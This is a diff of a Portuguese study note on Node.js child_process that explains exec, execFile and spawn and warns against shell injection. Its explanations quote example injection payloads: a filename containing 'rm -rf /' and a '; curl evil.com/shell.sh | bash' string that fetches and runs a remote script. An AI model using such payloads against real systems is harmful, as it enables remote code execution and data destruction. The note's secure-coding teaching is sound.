@@ -1,10 +1,10 @@
 ---
 title: "child_process com exec e spawn"
 created: 2026-05-07
-updated: 2026-05-07
+updated: 2026-06-28
 type: concept
-progress: backlog
-status: seedling
+status: growing
+fase: Adepto
 publish: true
 tags:
   - node
@@ -24,6 +24,44 @@ aliases:
 
 > [!abstract] TL;DR
 > `exec` é bufferizado, conveniente e **vulnerável a shell injection** — nunca passe input externo. `execFile` dispensa o shell e é mais seguro para comandos com argumentos. `spawn` retorna streams sem limite de buffer, ideal para output longo ou processos de longa duração. Regra de ouro: sempre prefira `execFile`/`spawn` com array de argumentos; `exec` só para comandos completamente hardcoded.
+
+---
+
+## Diagrama
+
+```mermaid
+flowchart LR
+    A(["`**Node.js
+    processo pai`"]):::parent
+
+    subgraph exec["exec — usa shell"]
+        B(["`**/bin/sh
+        interpreta string`"]):::shell
+        C(["`**comando**`"]):::cmd
+    end
+
+    subgraph execFile["execFile — sem shell"]
+        D(["`**executável**
+        direto`"]):::safe
+    end
+
+    subgraph spawnBox["spawn — streams"]
+        E(["`**executável**
+        stdout stream`"]):::safe
+    end
+
+    A -- "exec('cmd')" --> B --> C
+    A -- "execFile('bin', [args])" --> D
+    A -- "spawn('bin', [args])" --> E
+
+    style exec fill:#fce8e8,stroke:#D0021B
+    style execFile fill:#e8f4e8,stroke:#4A90D9
+    style spawnBox fill:#e8f4e8,stroke:#4A90D9
+    classDef parent fill:#4A90D9,color:#fff,stroke:#2c6fad
+    classDef shell fill:#D0021B,color:#fff,stroke:#8b0000
+    classDef cmd fill:#F5A623,color:#000,stroke:#c47d0e
+    classDef safe fill:#4A90D9,color:#fff,stroke:#2c6fad
+```
 
 ---
 
@@ -399,102 +437,214 @@ function transcode(input, output, onProgress) {
 
 ---
 
-## Armadilhas
+## Casos práticos
 
-### 1. Shell injection via `exec` com input externo
+### Caso 1 — Resize de imagem com ImageMagick via upload de usuário
 
-A armadilha mais grave. Qualquer string que passe por um shell pode ser manipulada com metacaracteres: `;`, `|`, `&&`, `||`, `$(...)`, `` `...` ``, `>`, `<`, `*`, `?`. Não existe sanitização confiável — a solução é evitar `exec` com input variável, ponto final.
-
-```javascript
-// ❌ — vulnerável independente da "sanitização"
-const filename = req.body.file.replace(/[^a-z0-9]/gi, '');  // insuficiente
-exec(`cat ${filename}`, callback);
-
-// ✓ — sem shell, sem injeção possível
-execFile('cat', [req.body.file], callback);
-```
-
-### 2. `maxBuffer` excedido silenciosamente
-
-`exec` e `execFile` têm limite de 1 MB por padrão. Quando excedido, o processo filho é encerrado e o callback recebe um erro `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. O output parcial é descartado. O problema é que isso pode não aparecer em testes com dados pequenos e só explodir em produção com dados reais.
+O usuário faz upload de uma imagem. O filename vem do request — é input externo. Usar `exec` aqui seria uma vulnerabilidade crítica. O caminho correto é `execFile` com array de argumentos.
 
 ```javascript
-// ❌ — quebra silenciosamente com output > 1MB
-exec('journalctl -n 10000', callback);
+import { execFile } from 'node:child_process/promises';
+import { randomUUID } from 'node:crypto';
+import path from 'node:path';
 
-// ✓ — opção 1: aumentar o limite (paliativo)
-exec('journalctl -n 10000', { maxBuffer: 10 * 1024 * 1024 }, callback);
+async function resizeUploadedImage(originalPath, width) {
+  // ✓ originalPath é input do usuário — array de args sem shell
+  const outputName = `${randomUUID()}.webp`;
+  const outputPath = path.join('/tmp/uploads', outputName);
 
-// ✓ — opção 2: usar spawn (sem limite)
-const proc = spawn('journalctl', ['-n', '10000']);
-proc.stdout.pipe(process.stdout);
+  await execFile('convert', [
+    originalPath,
+    '-resize', `${width}x`,     // dimensão hardcoded aqui
+    '-quality', '80',
+    outputPath,
+  ]);
+
+  return outputPath;
+}
+
+// Mesmo que originalPath seja "/tmp/x; rm -rf /" — chegará como string literal ao convert
+// O ImageMagick tentará abrir o arquivo com esse nome e falhará — sem executar nada extra
 ```
 
-### 3. Esquecer de ler stdout/stderr em `spawn`
+**Por que não `exec`**: `exec(\`convert ${originalPath} ...\`)` passa tudo por `/bin/sh`. Um `originalPath` como `"; curl evil.com/shell.sh | bash"` executaria o script remoto antes de tentar o convert.
 
-Quando `stdio` é `'pipe'` (padrão), o sistema cria buffers para stdout e stderr do processo filho. Se o processo escreve mais do que o buffer do kernel suporta e o Node **não consome** esses dados, o processo filho fica bloqueado esperando — deadlock silencioso.
+---
+
+### Caso 2 — Transcodificação de vídeo com progresso em tempo real
+
+O usuário solicita conversão de um arquivo de vídeo. `ffmpeg` produz gigabytes de output e pode rodar por minutos. `exec` e `execFile` bufferizariam tudo em memória e falhariam com `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. `spawn` com streaming é a única opção correta.
 
 ```javascript
-// ❌ — proc.stdout não é consumido; stderr pode bloquear o filho
-const proc = spawn('comando-que-produz-output');
-proc.on('close', (code) => console.log(code));
+import { spawn } from 'node:child_process';
+import { EventEmitter } from 'node:events';
 
-// ✓ — consumir sempre, mesmo que só para descartar
-proc.stdout.resume();  // Drena sem processar
-proc.stderr.resume();
-proc.on('close', (code) => console.log(code));
+function transcodeVideo(inputPath, outputPath) {
+  const emitter = new EventEmitter();
+  const controller = new AbortController();
+
+  const proc = spawn('ffmpeg', [
+    '-i', inputPath,
+    '-c:v', 'libvpx-vp9',
+    '-b:v', '0',
+    '-crf', '33',
+    '-progress', 'pipe:2',   // progresso em stderr (padrão ffmpeg)
+    '-y', outputPath,
+  ], { signal: controller.signal });
+
+  proc.stderr.on('data', (chunk) => {
+    const text = chunk.toString();
+    const match = text.match(/out_time_ms=(\d+)/);
+    if (match) emitter.emit('progress', parseInt(match[1], 10) / 1_000_000); // segundos
+  });
+
+  const done = new Promise((resolve, reject) => {
+    proc.on('close', (code) => {
+      if (code === 0) resolve(outputPath);
+      else reject(new Error(`ffmpeg exited with code ${code}`));
+    });
+    proc.on('error', (err) => {
+      if (err.name !== 'AbortError') reject(err);
+    });
+  });
+
+  return { emitter, done, cancel: () => controller.abort() };
+}
+
+// Uso:
+const job = transcodeVideo('/uploads/raw.mp4', '/output/final.webm');
+job.emitter.on('progress', (secs) => console.log(`${secs.toFixed(1)}s processados`));
+await job.done;
 ```
 
-### 4. `spawn` com `shell: true` — mesma vulnerabilidade de `exec`
+**Pontos importantes**: stderr é consumido mesmo que o conteúdo não interesse — sem consumo, o buffer do kernel trava o processo filho. O `AbortController` permite cancelamento limpo sem deixar o ffmpeg como processo órfão.
 
-`spawn` com `shell: true` passa o comando por um shell — tornando-o igualmente vulnerável a injeção. A documentação oficial (v23.11+) deprecou a combinação de `args` com `shell: true`.
+---
 
-```javascript
-// ❌ — shell: true elimina a proteção do array de args
-spawn('grep', [userInput, 'file.txt'], { shell: true });
+## Armadilhas comuns
 
-// ✓ — shell: false (padrão) — seguro
-spawn('grep', [userInput, 'file.txt']);
-```
+> [!warning] Shell injection via `exec` com input externo
+> **O que acontece:** Input externo concatenado na string de comando permite que um atacante injete metacaracteres de shell (`;`, `|`, `&&`, `$(...)`) e execute comandos arbitrários no servidor.
+>
+> **Por quê:** `exec` sempre interpreta a string em `/bin/sh` (Linux) ou `cmd.exe` (Windows). Não existe sanitização confiável — qualquer tentativa de filtrar metacaracteres pode ser contornada com variações de encoding ou combinações não previstas.
+>
+> **Como evitar:** Usar `execFile` ou `spawn` com argumentos como array — nunca concatenar input externo em strings passadas para `exec`. A solução é estrutural, não de sanitização.
+>
+> ```javascript
+> // ❌ — vulnerável independente da "sanitização"
+> const filename = req.body.file.replace(/[^a-z0-9]/gi, '');  // insuficiente
+> exec(`cat ${filename}`, callback);
+>
+> // ✓ — sem shell, sem injeção possível
+> execFile('cat', [req.body.file], callback);
+> ```
 
-### 5. Processo filho vira zumbi se o pai crasha
+---
 
-Se o processo pai encerra abruptamente sem encerrar os filhos, os filhos continuam rodando como processos órfãos. Em cenários de crash/restart frequente, isso acumula processos zumbi consumindo recursos.
+> [!warning] `maxBuffer` excedido silenciosamente
+> **O que acontece:** `exec` e `execFile` têm limite de 1 MB por padrão. Quando excedido, o processo filho é encerrado e o callback recebe `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. O output parcial é descartado — e o erro pode não aparecer em testes com dados pequenos, só explodindo em produção com dados reais.
+>
+> **Por quê:** `exec` e `execFile` bufferizam o output completo em memória antes de chamar o callback. Não há mecanismo de backpressure — o limite é fixo.
+>
+> **Como evitar:** Para output previsível e pequeno, ajustar `maxBuffer`. Para output de tamanho variável ou grande, migrar para `spawn` com streaming.
+>
+> ```javascript
+> // ❌ — quebra silenciosamente com output > 1MB
+> exec('journalctl -n 10000', callback);
+>
+> // ✓ — opção 1: aumentar o limite (paliativo)
+> exec('journalctl -n 10000', { maxBuffer: 10 * 1024 * 1024 }, callback);
+>
+> // ✓ — opção 2: usar spawn (sem limite)
+> const proc = spawn('journalctl', ['-n', '10000']);
+> proc.stdout.pipe(process.stdout);
+> ```
 
-```javascript
-// ✓ — usar AbortController para encerrar filhos ao sair
-const controller = new AbortController();
-const proc = spawn('long-process', [], { signal: controller.signal });
+---
 
-process.on('exit', () => controller.abort());
-process.on('SIGTERM', () => {
-  controller.abort();
-  process.exit(0);
-});
-```
+> [!warning] Esquecer de ler stdout/stderr em `spawn`
+> **O que acontece:** O processo filho fica bloqueado esperando que o Node consuma o output — deadlock silencioso. O processo não encerra, o event loop fica preso, e a requisição trava indefinidamente.
+>
+> **Por quê:** Quando `stdio` é `'pipe'` (padrão), o kernel cria buffers para stdout e stderr do processo filho. Se o processo filho escreve mais do que o buffer suporta e o Node não consome, o filho fica suspenso no write.
+>
+> **Como evitar:** Sempre consumir stdout e stderr — seja para processar, seja apenas para drenar (`.resume()`).
+>
+> ```javascript
+> // ❌ — proc.stdout não é consumido; stderr pode bloquear o filho
+> const proc = spawn('comando-que-produz-output');
+> proc.on('close', (code) => console.log(code));
+>
+> // ✓ — consumir sempre, mesmo que só para descartar
+> proc.stdout.resume();  // Drena sem processar
+> proc.stderr.resume();
+> proc.on('close', (code) => console.log(code));
+> ```
 
-### 6. Confundir código de saída com erro de spawn
+---
 
-`proc.on('error')` dispara quando **não foi possível iniciar o processo** (comando não encontrado, permissão negada). `proc.on('close', code)` dispara quando o processo iniciou e **encerrou com código diferente de 0**. São eventos distintos.
+> [!warning] `spawn` com `shell: true` — mesma vulnerabilidade de `exec`
+> **O que acontece:** Passar `shell: true` para `spawn` faz o comando passar por um shell — tornando o array de argumentos igualmente vulnerável a injeção. A proteção do array desaparece.
+>
+> **Por quê:** Com `shell: true`, o Node concatena o comando e os argumentos em uma string e repassa ao shell. A documentação oficial (v23.11+) deprecou a combinação de `args` com `shell: true` exatamente por esse motivo.
+>
+> **Como evitar:** Manter `shell: false` (padrão). Se precisar de recursos de shell (pipes, redirecionamentos), usar `exec` apenas com comandos completamente hardcoded.
+>
+> ```javascript
+> // ❌ — shell: true elimina a proteção do array de args
+> spawn('grep', [userInput, 'file.txt'], { shell: true });
+>
+> // ✓ — shell: false (padrão) — seguro
+> spawn('grep', [userInput, 'file.txt']);
+> ```
 
-```javascript
-proc.on('error', (err) => {
-  // err.code === 'ENOENT' → comando não encontrado
-  // err.code === 'EACCES' → sem permissão
-  console.error('Falha ao iniciar:', err.message);
-});
+---
 
-proc.on('close', (code, signal) => {
-  if (code !== 0) {
-    // O processo iniciou mas retornou erro
-    console.error(`Processo encerrou com código ${code}`);
-  }
-  if (signal) {
-    // Processo foi encerrado por sinal (ex.: SIGKILL)
-    console.error(`Encerrado por sinal: ${signal}`);
-  }
-});
-```
+> [!warning] Processo filho vira zumbi se o pai crasha
+> **O que acontece:** Se o processo pai encerra abruptamente sem encerrar os filhos, os filhos continuam rodando como processos órfãos. Em cenários de crash/restart frequente, isso acumula processos zumbi consumindo CPU e memória.
+>
+> **Por quê:** Processos filhos não são encerrados automaticamente quando o pai morre — o sistema operacional os re-adota para o processo init (PID 1). Apenas um encerramento explícito via sinal os termina.
+>
+> **Como evitar:** Usar `AbortController` e registrar handlers para `'exit'` e `'SIGTERM'` no processo pai para encerrar filhos antes de sair.
+>
+> ```javascript
+> // ✓ — usar AbortController para encerrar filhos ao sair
+> const controller = new AbortController();
+> const proc = spawn('long-process', [], { signal: controller.signal });
+>
+> process.on('exit', () => controller.abort());
+> process.on('SIGTERM', () => {
+>   controller.abort();
+>   process.exit(0);
+> });
+> ```
+
+---
+
+> [!warning] Confundir código de saída com erro de spawn
+> **O que acontece:** O handler de `'error'` nunca dispara (o processo iniciou com sucesso), mas o código de saída diferente de 0 é ignorado — o erro do processo externo passa despercebido.
+>
+> **Por quê:** `proc.on('error')` e `proc.on('close')` cobrem cenários distintos. `'error'` dispara quando **não foi possível iniciar** o processo (comando não encontrado, permissão negada). `'close'` dispara quando o processo iniciou e encerrou — com ou sem erro.
+>
+> **Como evitar:** Sempre registrar ambos os handlers e tratar o código de saída em `'close'`.
+>
+> ```javascript
+> proc.on('error', (err) => {
+>   // err.code === 'ENOENT' → comando não encontrado
+>   // err.code === 'EACCES' → sem permissão
+>   console.error('Falha ao iniciar:', err.message);
+> });
+>
+> proc.on('close', (code, signal) => {
+>   if (code !== 0) {
+>     // O processo iniciou mas retornou erro
+>     console.error(`Processo encerrou com código ${code}`);
+>   }
+>   if (signal) {
+>     // Processo foi encerrado por sinal (ex.: SIGKILL)
+>     console.error(`Encerrado por sinal: ${signal}`);
+>   }
+> });
+> ```
 
 ---
 
@@ -534,6 +684,19 @@ Usando `execFile` ou `spawn` com argumentos como array — nunca concatenando in
 
 **"O que acontece quando o output de `exec` excede o `maxBuffer`?"**
 O processo filho é encerrado pelo Node e o callback recebe um erro `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. O output parcial é descartado. O valor padrão é 1 MB. Para output grande, a solução correta é `spawn` com streaming.
+
+---
+
+## O que vem a seguir
+
+`exec`, `execFile` e `spawn` cobrem a execução de processos externos genéricos. Quando o processo externo que você quer spawnar é um **outro script Node.js** e você precisa de comunicação bidirecional (não só stdout), a ferramenta certa é `fork` — que adiciona um canal IPC automático ao processo filho. A nota `[[09 - child_process com fork - Node child com IPC]]` explora exatamente isso: quando `fork` ainda ganha de Worker Threads, como construir um supervisor tree com backoff exponencial, e os 4 casos onde isolamento total de processo faz diferença em produção.
+
+---
+
+## Fontes
+
+- [Node.js Docs — `child_process`](https://nodejs.org/api/child_process.html) — referência completa de `exec`, `execFile`, `spawn` e opções de `stdio`
+- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) — taxonomia de shell injection e vetores de ataque
 
 ---
 
